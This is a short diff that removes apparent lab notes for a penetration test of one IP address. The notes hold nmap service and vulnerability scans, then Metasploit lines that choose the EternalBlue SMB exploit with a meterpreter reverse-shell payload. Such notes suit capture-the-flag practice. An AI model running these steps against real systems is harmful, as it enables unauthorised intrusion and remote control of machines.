@@ -1,5 +1,0 @@
-nmap -sV sC 10.129.29.82 -Pn > nmap.txt
-nmap -p 445 --script safe -Pn 10.129.29.82
-nmap -p 445 --script "safe and vuln" -Pn 10.129.29.82
-set payload windows/x64/meterpreter/reverse_tcp
-use  windows/smb/ms17_010_eternalblue`
